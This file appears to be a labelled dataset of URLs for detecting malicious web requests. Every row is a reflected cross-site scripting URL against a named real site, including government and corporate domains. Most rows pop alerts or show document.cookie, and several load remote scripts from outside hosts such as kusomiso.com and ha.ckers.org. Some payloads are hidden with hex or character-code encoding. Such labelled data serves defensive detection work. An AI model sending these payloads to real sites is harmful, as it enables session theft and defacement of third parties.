http://ask.jp/dictionary.asp?o=%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2866%2c121%2c32%2<br>c107%2c117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c99%2c111%2c109%29%29%3c%2fscript%3e%0d%0a&amp;qsrc<br>=35&amp;q=link%3ahttp%3a%2f%2fwww.youtube.com%2fwatch%3fv%3dqvsgrwqgvl0&amp;btndic.x=43&amp;btndic.y=10,Malicious
http://www.leadership.nasa.gov/nasa/lmd/development/otherprograms/searchresults.asp?sw=discipline%'%<br>3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://enable.nat.gov.tw/valid.jsp?category=testicles%22%3ea%3c/a%3e%3cscript%3ealert(document.cooki<br>e);%3c/script%3e,Malicious
http://www.internetwache.brandenburg.de/sixcms/list.php?page=page_suche&amp;sv%5bvt%5d=%22%3e%3cscript%3<br>ealert%28%22pwnd+for+big-h+yo+%28%3b%22%29%3c%2fscript%3e&amp;volltextsuche=suche,Malicious
http://www.thinkgeek.com/brain/whereisit.cgi?t=%22%3e%3cscript%3ealert%28%27xssed%27%29%3b%3c%2fscri<br>pt%3e,Malicious
http://www.zdnet.nl/news.cfm?cat=1%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e&amp;subcat=5%22%<br>3e%3cscript%3ealert(document.cookie)%3c/script%3e&amp;mxp=115%22%3e%3cscript%3ealert(document.cookie)%3c<br>/script%3e,Malicious
http://www.cadburyindia.com/search/search.asp?search=%22%27%3e%3cscript%3ealert%28%27cueballr%27%29%<br>3c%2fscript%3e%3cmarquee%3e%3ch1%3e&amp;submit.x=0&amp;submit.y=0&amp;submit=search+%3e%3e&amp;mode=allwords,Malicious
http://www.corporateengineering.ch/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.amonline.net.au/search.cfm?searchstring=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://my.lgmobile.com/web/web.etc.totalsearch.laf?srchrange=all&amp;srchword==&gt;'&gt;&lt;script%20%0a%0d&gt;alert<br>('=xssbydt=')%3b&lt;/script&gt;,Malicious
http://dlh.net/cgi-bin/dlp.cgi?lang=eng&amp;sys=pc&amp;file=%3e%22%3e%3cscript%3ealert(/xss/);%3c/script%3e&amp;<br>ref=ps,Malicious
http://www.michelin.ru/ru/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.pixishop.dk/news_details.php?id=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%<br>3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://www.top129.com/list.php?q=pwn+%3cscript/src=%22http://tmp.vgood.com.tw/poc.js%22%3e%3c/script%3e+pwn,Malicious
http://www.funkyasp.co.uk/rate.asp?id=5&amp;asid=6034010&amp;hotid=%22%3e%3cscript%3ealert(%22document.cooki<br>e%22)%3c/script%3e,Malicious
http://www.merterinsesi.net/mods.php?go=downloads&amp;p=ld&amp;mode=file&amp;val=1%22%3e%3ch1%3eby%20st@rext%3c/<br>h1%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.silvercreekgifts.com/catalog_page.cfm?queries_index=index7&amp;title_bar=%3c/title%3e%3cbody%<br>3e%3ciframe%20src=javascript:alert(123)%3e&amp;product_catalogid=5&amp;productcode=3&amp;startrow=0&amp;advance=back<br>&amp;newproduct=0,Malicious
http://www.axn-asia.com/search/node/'%22--%3e%3cscript%3ealert(/w0ot/)%3c/script%3e,Malicious
http://www.consulfrance-atlanta.org/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20t<br>he%20rat')%3c/script%3e,Malicious
http://www.statistiques.developpement-durable.gouv.fr/accueil/recherche-avancee/resultats-recherche.<br>html?id=4&amp;no_cache=1&amp;tx_solr[q]=/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;&amp;search=ok,Malicious
http://ms163.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://chakb.com/info/showpage.jsp?pageid=9&amp;i=3&amp;coid=&amp;seid='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3<br>e%3cbr%3e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://www.stompies.com/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://search.sbs.co.kr/search.jsp?start=0&amp;sort=&amp;sortorder=%22%3e%3c/script%3e%3cscript%20src=http:/<br>/ha.ckers.org/xss.js%3e%3c/script%3e,Malicious
http://support.realdsl.be/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.com/chat/c<br>.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(document.coo<br>kie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious
http://www.2m.tv/studio2m2007/candidat.asp?id=16846&amp;candidat=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;,Malicious
http://www.eurolive.com/?id=49569&amp;langue=fr&amp;tracker=yahbon-doigt&amp;w=1%27%22%3e%3c/title%3e%3cscript%3<br>ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.ms-s.net/look.php?cat1=6&amp;mode=syou&amp;t='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%<br>3c/script%3e,Malicious
http://www.honda.co.uk/search/?q=%22%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%2c32%2<br>c66%2c121%2c32%2c84%2c101%2c99%2c104%2c105%2c101%29%29%3c%2fscript%3e,Malicious
http://www.benq.com.sg/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://docbweb.acp.pt/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;trmcols=2&amp;form=co<br>mp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.ncasindia.org/public/searchengineinternal/default.asp?search=%22%3cscript+src%3dhttp://vu<br>ln.xssed.net/thirdparty/scripts/hotpockets.js%3e,Malicious
http://www.easyinfo.co.za/search.php?query=%22%3e+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3b<br>a%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+ha<br>ri%28topsecure.net%29%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://comments-submit.nasa.gov/commenting/comment.do?location=http://polls.nasa.gov/voteform.html&amp;s<br>iteid=245486071&amp;username=guest&amp;email=guest@dummy.com&amp;comment=xylitol%27%22%3e%3c/title%3e%3cscript%3<br>ealert(%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%<br>3c/marquee%3e,Malicious
http://www-gap.dcs.st-and.ac.uk/search/search.cgi?forum=1&amp;man4=1&amp;word=%3cscript%3edocument.documente<br>lement.innerhtml%3d%22xss+found%22%3b%3c%2fscript%3e,Malicious
http://www.g73.net/search.php?uid=ws848d8024088c327.36898031&amp;src=&amp;term=&lt;script&gt;alert(123)&lt;/script&gt;&amp;a<br>rgs=qs%3d06oenya4zgjblucui1zo4rsv7zu-98uc-m76af47ky6_wubwvg5thczhitql4l8vtkkhxls2m3xyw1qvlpplwzchyvq<br>kpm7bpb1q74swbrtha98bbgczpk1u0habuumdc3lu11uap-qpe32b-h_0ms2b8eqitz_lmfjloff10frmvri26q-gwo1zuv%2cyt<br>03&amp;sec=r,Malicious
http://vault.sportsillustrated.cnn.com/vault/result/article/index.htm?query=%3ciframe%20src=%22javas<br>cript:alert(%27xss%20by%20\nxylitol%27);%22%3e%3c/iframe%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3<br>c/h1%3e%3c/marquee%3e&amp;searchtype=mag_article&amp;exactclause=&amp;notclause=&amp;orclause=&amp;startdt=&amp;enddt=&amp;shoot<br>id=&amp;sortby=date&amp;currentpage=1&amp;npp=10,Malicious
http://poliperlis.edu.my/igallery33/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://esupport.trendmicro.com/support/help/en_us/%3cscript%3ealert('xss%20from%20sshjason');%3c/scr<br>ipt%3e,Malicious
http://www.asharedfutureni.gov.uk/index/speeches-biography/search.jsp/search.lsim?ha=%27%22%3e%3cscr<br>ipt%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.theonion.com/content/search/onion/advanced?search=&lt;script&gt;alert('do you like<br>coffee?')&lt;/script&gt;&amp;restrict=.site:onion,Malicious
http://news.naver.com/news/main2.php?mode=lss2d&amp;section_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.onurhosting.net/signinform.php?msg=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28<br>%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%<br>2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%3<br>9%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://mzr.gov.uz/index.php?id=index&amp;lang=uz&amp;tpl=printable}%3c/style%3e%3cscript%3ea=eval;b=alert;a(<br>b(/xss/.source));%3c/script%3e,Malicious
http://www.echannelline.com/usa/story.cfm?item=23100%22%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2<br>0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<br>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%<br>20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cscript%20src=http://lupbot.comul<br>e.com/asu_abangjs.php%3e%3c/script%3e,Malicious
http://www.telsim.com.tr/musterihizmetleri/anasayfa/cepshoplistesi.php?sehir=%3cscript%3ealert(/crac<br>kers_child%20hacked%20your%20system/)%3c/script%3e,Malicious
http://blue-1.hevra.haifa.ac.il/rubin/photo/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gamerankings.com/itemrankings/itemsearch.asp?itemname=%22%3e%3cscript%3ealert%28%27xss%27<br>%29%3c%2fscript%3e&amp;extsearch=0,Malicious
http://ms153.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.mess.be/pafiledb/pafiledb.php?string=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%<br>29%2f%2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromchar<br>code%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%<br>3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3<br>e&amp;action=search&amp;search=do,Malicious
http://www.nitakeacloserlook.gov.uk/search.jsp/search.lsim?ha=%27%22%3e%3cscript%3ealert(%22xss%22)%<br>3c/script%3e,Malicious
http://www.devon.gov.uk/atoz.htm?letter=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/<br>h1&gt;&lt;/marquee&gt;,Malicious
http://www.tucows.com/search?search_terms=&quot;&gt;&lt;script&gt;alert('x')&lt;/script&gt;&amp;search_scope=lin&amp;search_adv=<br>0&amp;search_size=&amp;search_size_multi=b,Malicious
http://search.pathfinder.gr/cached.php?docid=7703926&amp;u=www.ypex.gov.gr/www.mfa.gr/oldnew%27%22%3e%3c<br>/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/<br>marquee%3esdetails.aspx?uiculture=en-us&amp;articleid=4139&amp;q=foremost,Malicious
http://ar.netlog.com/go/search/view=people&q=%22%3e%3cscript%3ealert%281%29;%3c/script%3e&%22%3e%3cscript%3ealert%28511%29;%3c/script%3e=g,Malicious
http://www.tigaer-design.com/v4.1/gallery/gallery.php?id=%22%3e%3c/title%3e%3cscript%3ealert%281337%<br>29%3c/script%3e,Malicious
"http://bill.paiz.gov.pl/brownfields/showoffer.php?idoffer=';alert(string.fromcharcode(88,83,83))//\'<br>;alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.f<br>romcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))<br>%3c/script%3e",Malicious
http://www.kaatoo.de/index.php?s=%22%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e,Malicious
http://www2.worldlingo.com/wl/search/search_results.html?query=%22'%3e%3cscript%3ealert(1)%3c/script<br>%3e&amp;submit=search+again,Malicious
http://rfptemplates.technologyevaluation.com/search/for/?k=&lt;/title&gt;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;t<br>esticles&amp;btnsubmit=search&amp;searchtype=relevance,Malicious
http://www.surat.com.tr/eng/default.asp?m_id=1&amp;type=2&amp;section_id=1&amp;c_id=47&amp;title=&lt;script&gt;alert(&quot;scri<br>ptorium(turkey)hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://home.1asphost.com/edwinsel/asp/searchcols.asp?landen=po&amp;minhoogte=1000&amp;noform=1&amp;title=&lt;script<br>&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;,Malicious
"http://sistemas.unq.edu.ar/mensajes/default.asp?to=ebonnier,ebonnier@psi.uba.ar,%20emanuelbonnier@ya<br>hoo.com.ar%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss<br>%20by%20xylitol%3c/h1%3e%3c/marquee%3e",Malicious
http://mirr0r.baskak.com/deface_mirror/?id=1889%22%3e'%3e.%3c/iframe%3e%3c/p%3e'%3e%22%3e%3cscript%3<br>ealert(document.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e%3c/marquee%3e,Malicious
http://www.wilson.com/wilson/staff/home.jsp?bmlocale=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/tit<br>le%3e%3cscript%3ealert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3eno<br>rehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.ci<br>bernautica.com/forocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersa<br>in.iespana.es/xss.html%20%3c,Malicious
http://benq.com.hr/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.adidas.com/br/shared/help/help_contact-us.asp?strcountry=br&amp;strbrand=';alert(string.fromc<br>harcode(84,69,83,84,69))//\';alert(string.fromcharcode(84,69,83,84,69))//%22;alert(string.fromcharco<br>de(84,69,83,84,69))//\%22;alert(string.fromcharcode(84,69,83,84,69))//--%3e%3c/script%3e%22%3e'%3e%3<br>cscript%3ealert(string.fromcharcode(84,69,83,84,69))%3c/script%3e",Malicious
http://www.elcom.com.au/performsearch.aspx?articleid=800&amp;moduleid=1097&amp;keywords=%22%3e%3cscript%20sr<br>c=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js%3e%3c/script%3e,Malicious
http://www.maryjoshively.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=3201&amp;hid<br>eresetbtn=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3ealert(<br>'norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/m<br>arquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibe<br>rnautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%<br>20%3c,Malicious
http://www.mopas.go.kr/gpms/srch/search.jsp?searchname=&amp;stype=1&amp;query=%3c%2fscript%3e%3cscript+src%3<br>dhttp%3a%2f%2fha.ckers.org%2fxss.js%3e%3c%2fscript%3e&amp;x=34&amp;y=12,Malicious
http://www.ubcdanceclub.com/content.php?sectionid=2&amp;contentid=40&amp;newsid=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;,Malicious
http://onefm.ro/dj-profile.php?id=%22%3e%3cscript%3ealert(/illuz1on-at-r00tdefaced.net/)%3c/script%3<br>e,Malicious
http://www.re1031solutions.com/?pg=asdf%3cscript%3ealert(1337)%3c/script%3e&amp;frame=1,Malicious
http://treasury.fgov.be/search_en.asp?subsite=%2finterthes%2c%2finterstaben%2c%2finterintbeten%2c%2f<br>intercdvupfr%2c%2finterdepofr%2c%2finterdette%2c%2fintermunt%2c%2finterreco%2c%2finterstabfr%2c%2fin<br>teraudfr%2c%2fintergbgl%2c%2finterintbetfr%2c%2fintercdvupnl%2c%2finterdeponl%2c%2finterdette%2c%2fi<br>ntermunt%2c%2finterreco%2c%2finterstabnl%2c%2finteraudnl%2c%2fintergbgl%2c%2finterintbetnl%2c%2finte<br>rfisc%2c%2finterfinvesten%2c%2finterfaabfr%2c%2finterfafzfr%2c%2finterfainvfr%2c%2finterfakredfr%2c%<br>2finterfaoiffr%2c%2finterfbbifr%2c%2finterfdafr%2c%2finterfinvestfr%2c%2finterfpatrfr%2c%2finterfaab<br>nl%2c%2finterfafznl%2c%2finterfainvnl%2c%2finterfakrednl%2c%2finterfaoifnl%2c%2finterfbbinl%2c%2fint<br>erfdanl%2c%2finterfinvestnl%2c%2finterfpatrnl%2c%2finterdocu%2c%2fintersalgen%2c%2fintersalgfr%2c%2f<br>intersalgnl&amp;maxrecs=20&amp;criteria=x&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious
http://saturn.jpl.nasa.gov/search/?searchbox=%22%3e%3cbig%3e%3cbold%3e%3cfont%20color=red%3e%3cmarqu<br>ee%3exss%3c/marquee%3e%3c/font%3e%3c/bold%3e%3c/big%3e,Malicious
http://www.comune.napoli.it/flex/cm/pages/communityloginout.php/l/it/bl/?username=%22%3e%3cscript%3e<br>alert%281%29%3c%2fscript%3e&amp;password=&amp;submit=entra&amp;bl=,Malicious
http://www.localschooldirectory.com/include/information/az/category_2/aims_chart.php?district_page=y<br>&amp;state_page=y&amp;subject=&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;grade=grade,Malicious
http://www.barbatmitzva.co.il/halls.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://www.lge.co.kr/cokr/mypage/p_register/mypageseriallistcmd.laf?authflag=n&amp;actcode=serial%22%3e%<br>3cscript%20%0a%0d%3ealert(%22xss%20by%20d3vbit3%22);%3c/script%3e,Malicious
http://www.vattenfall.de/de/seite-empfehlen.htm?sendpageurl=%22%3e%3cscript%3ealert%28document.cooki<br>e%29;%3c/script%3e,Malicious
http://www.esaj.net/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.online-degree-scholarships.com/vsa/login.php?login_message=&lt;iframe<br>src=&quot;http://xssed.com&quot;&gt;,Malicious
http://www.sap.info/index.php4?action=noframe&amp;url=%22%3e%3cscript%3ealert(%22xssed%22)%3c/script%3e,Malicious
http://www.hobbytoys.it/store/customerauthenticateform.asp?redirecturl=customerwishlistadd.asp?idpro<br>duct=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b%3c%2fscript%3e,Malicious
http://www.minc.ne.jp/~fseguchi/shop/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-%20unk<br>n0wn.eu%27%29%3c%2fscript%3e,Malicious
http://www.wondernet24.de/cmscontent/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.msanti.net/blog/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript%20%0a%0d%3ea<br>lert(document.cookie)%3b%3c/script%3e,Malicious
http://www.elaimetjaymparisto.fi/kortit/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious
http://plantronics.corpteluk.com/page.cfm?pageid=1323&amp;kp=%7bts+%272007-07-09+00%3a10%3a40%27%7d&amp;simp<br>lesearch=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75%<br>61%72%74%79%22%29%3c%2f%73%63%72%69%70%74%3e&amp;x=5&amp;y=12,Malicious
http://cracker.com/parking.php4?task=search&amp;domain=cracker.com&amp;trackquery=1&amp;s=6a9f86578406d897ff51&amp;t<br>b=0&amp;a_id=1&amp;language=en&amp;pxy_t=0&amp;start=1&amp;add_c=86644d12779f78c9fc68c35d2bcc6465&amp;sub=1&amp;keyword=%27%3e%2<br>2%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxss.js%3e%3c%2fscript%3e&amp;search=search,Malicious
http://www.redbullusa.com/en/search/htmlsearch.action?keyword=test&quot;%3e%3cscript%3ealert('s0m.ph')%3c<br>%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://ponsel-online.com/index.php?action=store.showproduct&product_id=<script>alert(31337);</script>,Malicious
http://www.supervlaai.nl/applications/search_191.html?max=false&amp;current=1&amp;trefwoord=&lt;script&gt;alert(12<br>3)&lt;/script&gt;,Malicious
http://epacplanesnormas.mma.gob.cl/ver_detalle.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/<br>script%3e,Malicious
http://www.deperu.com/buscador/?cx=partner-pub-8402702179065883%3a9836146038&amp;cof=forid%3a10&amp;ie=utf-8<br>&amp;q=%3cscript%3ealert%28777%29%3c%2fscript%3e&amp;sa=buscar,Malicious
https://www.fly.faa.gov/rvsm/rvsminputerror.jsp?msg=<script>alert('lastrider-cyberbellona')</script>,Malicious
http://catalog.mysearch-in.net/cgi-bin/shopsearch.pl?text=%3e%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e,Malicious
http://www.gemax.rs/sr/info/news.html?view=comment&amp;topicid=170&amp;type=&quot;/&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;,Malicious
http://www.cypack.com/manage/show_whois.html?domain='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.<br>js%3e%3c/script%3e,Malicious
http://search.isp.netscape.com/nsisp/search?query=oakley+sunglasses&amp;frompage=weathertop5%22%3e%27%3e<br>%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%<br>28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%3<br>5%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e<br>%0a,Malicious
http://mk-board.net/login.cgi?id=lb%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://www.weboglasi.net/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.contergan-hamburg.de/artmedic_cms33/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.disfer.com.br/index.php?secao=catalogo&amp;busca=%3cscript%3ealert%28%22fzero+rulez+%3b%29%22<br>%29%3c%2fscript%3e&amp;x=14&amp;y=16,Malicious
http://www.ilemaurice-tourisme.info/page.php?page_id=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://support.gomposerz.ch/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.com/chat<br>/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(document.c<br>ookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious
http://ooegm.meb.gov.tr/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious
http://www.saglikbilgisi.com/soru.php?ax=soru_izle&amp;soru_id=205&amp;kid=1&amp;mod=''&gt;&lt;script&gt;alert('xss')&lt;/sc<br>ript&gt;,Malicious
http://www.gulsa.com.tr/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(docum<br>ent.cookie)&lt;/script&gt;,Malicious
http://www.titivillus.it/periodico.php?id=15%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.ridestevenspass.com/%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://imageshack.us/shareable/?i=%22%20/%3e%3cmarquee%3e%3cscript%3ealert%28/xssed/.source%29%3c/sc<br>ript%3e,Malicious
http://help.travian.ru/index.php?type=%22%3e%3c/script%3e%3cscript%3ealert(/xssed_by_omeha/);alert(d<br>ocument.cookie);%3c/script%3e,Malicious
http://www.hopkinsvilleclassifieds.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.penisbuyutucuhap.com/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3<br>c/script%3e,Malicious
http://www.cemfi.es/index.asp?lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewh<br>itehat%20forever%3c/marquee%3e,Malicious
http://www.nic.it/sr?set_language=vas%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.megaoyuncak.com/oyuncak-ara.asp?kelime=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://support.rapidhost.co.uk/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.com/c<br>hat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(documen<br>t.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious
